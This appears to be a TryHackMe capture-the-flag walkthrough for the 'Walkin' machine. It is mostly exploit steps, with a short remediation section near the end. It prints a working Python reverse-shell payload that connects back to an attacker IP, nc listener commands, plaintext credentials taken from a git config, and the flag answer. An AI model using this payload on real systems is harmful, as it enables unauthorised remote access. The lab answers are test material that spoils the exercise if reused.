---
title: Walkin
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Walkin machine
  on TryHackMe.
slug: walkin
---




**Target:** `10.201.87.78`  
**Date:** 2025-09-30  

---

## Summary

Quick and clean: an HTTP service on port **8000** turned out to be a SimpleHTTP server exposing a Python evaluation context. By sending Python expressions we got remote code execution, used a one-liner reverse-shell payload to obtain a `www-data` shell, discovered a `.git` directory under `/opt/dev` containing a git `config` with credentials for user `think` (`_TH1NKINGPirate$_`), switched to `think`, and read `user.txt`.

**Flags found**
- `user.txt`: `996bdb1f619a68361417cabca5454705`

---

## 1) Recon — Nmap

> Run the aggressive/full-port Nmap scan used:

```bash
nmap -T4 -n -sC -sV -Pn -p- 10.201.87.78
```

> Key relevant output (abridged):

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
```

> Nmap indicates a Python SimpleHTTP server on port 8000. It also shows odd fingerprint responses that suggest the service executes or interprets input (error messages containing `name 'GET' is not defined`, etc.). This hints a Python REPL-like behaviour behind the HTTP interface.

---

## 2) Probe the web service

Quick check with `curl`:

```bash
curl -v 10.201.87.78:8000
```

Returned a `200 OK` from `SimpleHTTP/0.6 Python/3.11.2`, but the HTML body was minimal.

Next, try a raw TCP connection with `nc` to interactively probe what the server expects:

```bash
nc 10.201.87.78 8000 -v
```

When you type expressions you see Python-style responses, for example:

```
1+1
# => (server responds)
whoami
# => name 'whoami' is not defined
ls
# => name 'ls' is not defined
```

So the remote side is evaluating Python code strings — not a normal web app. That allows arbitrary Python execution.

---

## 3) Get a reverse shell (RCE -> shell)

> Because we can evaluate Python, execute a reverse-shell one-liner from the host back to our machine. On your attacker (Kali) machine start a listener:

```bash
nc -lvnp 4445
```

> Then send this payload via the TCP connection to the service (example payload used here):

```python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.21.16.42",4445));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
import pty; pty.spawn("/bin/bash")
```

**Notes:** adjust the IP `10.21.16.42` to your attack box IP. The service executed the payload and connected back. Listener output shows a connection from `10.201.87.78` and you receive a `www-data` shell.

> You may see `bash: /root/.bashrc: Permission denied` — ignore that. To stabilize the shell run:

```bash
SHELL=/bin/bash script -q /dev/null
# or
stty raw -echo && fg
```

> Now you have an interactive shell as `www-data`.

---

## 4) Initial discovery on target (post-exploit)

Once on the box as `www-data`:

```bash
cd /opt/dev
ls -la
# reveals a .git directory
cd .git
ls -la
cat config
```

`/opt/dev/.git/config` contained:

```
[credential "https://github.com"]
    username = think
    password = _TH1NKINGPirate$_
```

This is a clear credential disclosure in the repository config.

---

## 5) Use the credential — become `think`

> The password from the git config was used to switch to the `think` account locally.

> From the `www-data` shell:

```bash
su - think
# enter password: _TH1NKINGPirate$_
```

> You are now `think`.

> Check home and read the user flag:

```bash
cd ~
ls -lah
cat user.txt
# 996bdb1f619a68361417cabca5454705
```

> Flag captured: `996bdb1f619a68361417cabca5454705`.

---

## 6) Notes and remediation

What went wrong (brief):

- An HTTP endpoint allowed raw execution/evaluation of Python code (REPL-like) — this is remote code execution by design or misconfiguration.
- A project `.git` directory was left accessible under `/opt/dev`, and the git `config` contained plaintext credentials.

Immediate remediation recommendations:

- Remove or restrict any REPL/interactive execution endpoints in production. If such functionality is needed for dev, restrict it to localhost and require authentication.
- Do not serve `.git` directories or any VCS metadata publicly; ensure webroots do not expose `.git` or `.svn` folders.
- Never store plaintext credentials in repository files or git config. Use secret managers or environment variables and rotate exposed credentials immediately.
- Harden the application by escaping or disabling direct evaluation of user input and adding strong input validation.

---

## 7) Commands & quick cheat-sheet

```bash
# Recon
nmap -T4 -n -sC -sV -Pn -p- 10.201.87.78

# Probe
curl -v 10.201.87.78:8000
nc 10.201.87.78 8000 -v

# Reverse shell (listener on attacker)
nc -lvnp 4445

# Payload (send into the REPL/connection)
# adjust attacker IP
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.21.16.42",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")

# Stabilize shell on connect
SHELL=/bin/bash script -q /dev/null
# or
stty raw -echo && fg

# Look for git and credentials
cd /opt/dev/.git
cat config

# Use credential
su - think
# password: _TH1NKINGPirate$_
cat ~/user.txt
```

---

---